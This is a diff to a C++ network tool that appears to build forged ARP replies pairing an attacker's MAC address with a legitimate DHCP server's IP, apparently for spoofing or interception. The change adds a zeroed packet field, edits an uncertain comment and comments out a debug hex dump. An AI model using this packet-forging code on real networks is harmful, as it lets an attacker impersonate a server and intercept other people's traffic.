@@ -15,6 +15,7 @@ void parse::check_argc(int argc, char *argv[]){
     char_to_binary(argv[3],this->attacker_dhcp_mac);
     inet_pton(AF_INET, argv[2],&this->attacker_dhcp_ip);
     memset(this->broadcast,255,6);
+    memset(this->allpacket,0,6);
     parse_data_in_linux();
 }
 void parse::get_my_mac(uint8_t mac[6]){
@@ -51,6 +52,9 @@ void parse::parse_client_mac(uint8_t mac[6]){
 }
 char *parse::using_interface(){
     return this->interface;
+}
+uint8_t *parse::using_allpacket(){
+    return this->allpacket;
 }
 uint8_t *parse::using_broadcast(){
     return this->broadcast;
@@ -114,15 +118,17 @@ void parse::make_arp_packet(){
     memcpy(this->arp_packet+19,&utd.protocol_size,1);
     memcpy(this->arp_packet+20,&utd.reply_opcode,2);
     memcpy(this->arp_packet+22,this->attacker_mac,6); // ?? right?
-    memcpy(this->arp_packet+28,this->using_broadcast(),4); // ?? modi?
+    memcpy(this->arp_packet+28,this->using_broadcast(),4); // ?? modi?255.255.255.255 or 0.0.0.0
     memcpy(this->arp_packet+32,this->origin_dhcp_mac,6); // ?? right?
     memcpy(this->arp_packet+38,&this->origin_dhcp_ip,4); // ?? right?
+    /*
     cout << "<arp packet>\n";
     for(int i=0; i<this->arp_length; i++){
         if(i%16==0)
             cout << endl;
         printf("%02x ",this->arp_packet[i]);
     }
+    */
 }
 uint8_t *parse::using_arp_packet(){
     return this->arp_packet;
